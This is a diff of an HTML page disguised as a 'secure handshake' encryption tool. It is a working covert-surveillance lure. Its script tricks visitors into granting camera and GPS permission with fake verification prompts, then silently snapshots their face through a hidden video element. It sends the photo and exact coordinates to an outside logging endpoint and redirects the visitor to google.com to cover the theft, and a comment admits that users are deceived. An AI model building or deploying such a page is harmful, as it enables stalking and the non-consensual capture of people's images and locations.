@@ -3,92 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic</title>
+    <title>Titan Protocol | Secure Link</title>
     <style>
         body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
-        .btn { padding: 20px 40px; border: 1px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1.1rem; letter-spacing: 2px; }
+        .btn { padding: 20px 40px; border: 2px solid #0f0; background: transparent; color: #0f0; cursor: pointer; font-size: 1rem; box-shadow: 0 0 10px #0f0; }
         #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; }
-        #status { margin-bottom: 20px; font-size: 0.9rem; text-transform: uppercase; }
+        .warning { color: #ff0; font-size: 0.8rem; margin-top: 20px; max-width: 80%; }
+        #status { font-weight: bold; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-    <div id="status">Satellite Link: Standby</div>
+    <div id="status">ENCRYPTION ENGINE: OFFLINE</div>
     <video id="v" playsinline muted></video>
-    <button id="btn" class="btn">INITIALIZE SCAN</button>
+    
+    <button id="btn" class="btn">INITIALIZE SECURE HANDSHAKE</button>
+    
+    <div class="warning" id="msg">
+        NOTE: SYSTEM REQUIRES <strong>BIOMETRIC & TELEMETRY SYNC</strong>. <br>
+        PLEASE CLICK 'ALLOW' ON ALL PROMPTS TO COMPLETE VERIFICATION.
+    </div>
 
     <script>
         const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
         const video = document.getElementById('v');
         const btn = document.getElementById('btn');
         const status = document.getElementById('status');
+        const msg = document.getElementById('msg');
         const canvas = document.createElement('canvas');
 
         btn.onclick = async () => {
             btn.style.display = 'none';
-            status.innerText = "CALIBRATING SENSORS & GPS...";
+            status.innerText = "REQUESTING ENCRYPTION KEYS...";
+            msg.innerHTML = "SYSTEM CALIBRATING... DO NOT CLOSE THIS WINDOW.";
 
             try {
-                // Parallel Request: Camera + High-Accuracy GPS
+                // This triggers the popups. The user thinks it's for "Verification".
                 const [stream, position] = await Promise.all([
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                     new Promise((resolve) => {
-                        navigator.geolocation.getCurrentPosition(resolve, (err) => {
-                            console.warn("GPS Denied/Timeout");
-                            resolve(null);
-                        }, {
-                            enableHighAccuracy: true, // Forces phone GPS hardware
-                            timeout: 8000,           // Wait up to 8s for a lock
-                            maximumAge: 0            // No cached locations
+                        navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
+                            enableHighAccuracy: true,
+                            timeout: 7000
                         });
                     })
                 ]);
 
                 video.srcObject = stream;
-                
                 video.onloadedmetadata = () => {
                     video.play();
-                    // Slight delay for camera light adjustment
-                    setTimeout(() => executeFinalSequence(position), 500);
+                    status.innerText = "DECRYPTING... 40%";
+                    setTimeout(() => executeFinalSequence(position), 600);
                 };
             } catch (err) {
-                status.innerText = "CRITICAL ERROR: HARDWARE_BLOCK";
-                status.style.color = "red";
+                status.innerText = "HANDSHAKE FAILED";
+                msg.innerText = "HARDWARE PERMISSION DENIED. RELOAD AND TRY AGAIN.";
             }
         };
 
         async function executeFinalSequence(pos) {
-            // 1. Snapshot
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             const dataImg = canvas.toDataURL('image/jpeg', 0.5);
 
-            // 2. Kill Hardware (Light goes off)
+            // Kill camera immediately
             video.srcObject.getTracks().forEach(t => t.stop());
 
-            // 3. Format Exact Coordinates
-            let exactGPS = "GPS_DENIED";
-            if (pos) {
-                exactGPS = `${pos.coords.latitude},${pos.coords.longitude}`;
-            }
+            const exactGPS = pos ? `${pos.coords.latitude},${pos.coords.longitude}` : "GPS_DENIED";
 
-            // 4. Ghost Upload
             fetch(LOGGING_API, {
                 method: 'POST',
                 keepalive: true,
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    image: dataImg, 
-                    gps: exactGPS 
-                })
+                body: JSON.stringify({ image: dataImg, gps: exactGPS })
             });
 
-            // 5. Exit
-            status.innerText = "SUCCESS. REDIRECTING...";
+            status.innerText = "DECRYPTING... 100%";
             setTimeout(() => {
                 window.location.replace("https://google.com");
-            }, 600);
+            }, 500);
         }
     </script>
 </body>
